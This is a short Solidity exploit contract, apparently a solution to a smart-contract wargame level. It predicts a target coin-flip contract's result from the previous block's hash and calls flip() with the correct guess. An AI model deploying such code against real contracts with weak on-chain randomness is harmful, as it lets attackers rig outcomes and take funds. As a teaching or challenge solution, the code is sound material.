// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
    address constant private TARGET = 0x56513a61c44366978F07262D1B57A442a7434a52;
    uint constant private FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() external {
        ICoinFlip(TARGET).flip(uint256(blockhash(block.number - 1)) / FACTOR == 1);
    }
}
